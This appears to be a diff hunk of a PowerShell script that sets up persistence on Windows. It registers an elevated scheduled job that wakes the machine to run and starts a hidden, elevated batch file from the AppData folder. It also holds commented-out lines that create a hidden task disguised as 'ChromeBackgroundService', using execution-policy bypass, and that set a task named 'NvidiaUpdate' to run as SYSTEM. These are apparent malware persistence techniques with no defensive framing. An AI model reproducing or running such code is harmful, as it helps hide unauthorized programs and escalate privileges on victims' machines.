@@ -42,10 +42,10 @@ $trigger = @(
 
 $options = New-ScheduledJobOption -RunElevated -ContinueIfGoingOnBattery -StartIfOnBattery -WakeToRun
 Register-ScheduledJob -Name $jobname -ScriptBlock $scriptblock -Trigger $trigger -ScheduledJobOption $options
-pause
+
 
 #schtasks /create /sc minute /mo 50 /tn "ChromeBackgroundService" /tr "powershell.exe -executionpolicy bypass -NoProfile -WindowStyle Hidden -command 'cscript.exe $homedir\sec.vbs'" /f
 
-Set-ScheduledTask -TaskName "NvidiaUpdate" -User "NT AUTHORITY\SYSTEM"
+#Set-ScheduledTask -TaskName "NvidiaUpdate" -User "NT AUTHORITY\SYSTEM"
 
 start-process "cmd.exe" "/c %appdata%\Microsoft\backdrop.bat" -WindowStyle Hidden -Verb RunAs
